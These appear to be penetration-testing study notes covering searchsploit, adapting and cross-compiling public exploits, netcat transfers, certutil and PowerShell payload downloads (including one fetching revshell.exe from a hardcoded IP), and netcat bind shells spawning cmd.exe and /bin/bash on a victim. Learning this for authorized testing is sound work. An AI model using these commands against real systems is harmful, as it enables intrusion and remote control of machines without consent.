# Publicly available exploits

- Exploit-db: https://www.exploit-db.com/
- Rapid7 - https://www.rapid7.com/db/?q=&type=

# Searchsploit

- searchsploit -m "<id>" 
- `searchsploit -m 39161` : move exploit file to current folder
- -c flag for case sensitive on
- -t flag to search in title
- -e flag for exact match
- -w flag for online link instead of local file
- searchsploit remote windows smb
- searchsploit remote linux ssh
- searchsploit remote webapps wordpress
- searchsploit local windows : for local privesc on windows

# Fixing Exploits

- change local ip and port
- like, in hfs 2.3 local exploit code, we need to set local ip and port 
- we also need to run a python http server hosting nc.exe
- we can find nc.exe in /usr/share/windows-resources/binaries/nc.exe

# Compiling exploit code

- sudo apt install mingw-w64 gcc
- i686-w64-mingw32-gcc 9303.c -o exploit : will generate .exe file for x64
- i686-w64-mingw32-gcc 9303.c -o exploit -lws2_32: will generate .exe file for x32

- precompiled exploit-db files: https://github.com/offensive-security/exploitdb-bin-sploits
- reverse-shell cheatsheet: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md`
- online reverse-shell generator: https://www.revshells.com/

# Useful paths

- /usr/share/exploitdb
- /usr/share/windows-resources/binaries/nc.exe

# Netcat

- nc -nvlp 8080 (listen on port 8080)
- nc -nv (connect to tcp port)
- nc -nvu <ip> <port> : connect to udp port
Transferring files:
- nc -nvlp 1234 > test.txt (recepient)
- nc -nv ip port < test.txt (sender)

# Certutil

- used to download files on windows
- `certutil -urlcache -f <dl_url> <out_file>` 
- `certutil -urlcache -f http://<ip>/nc.exe nc.exe`
Alternative command:
- `powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.17.5.136:8000/revshell.exe','revshell.exe')"`

# Bind Shells:

- `nc.exe -nlvp port -e cmd.exe `(windows victim)
- `nc -nv ip port` (linux attacker)

- `nc -nvlp port -e /bin/bash` (linux victim)
- `nc.exe -nv ip port` (windows attacker)
 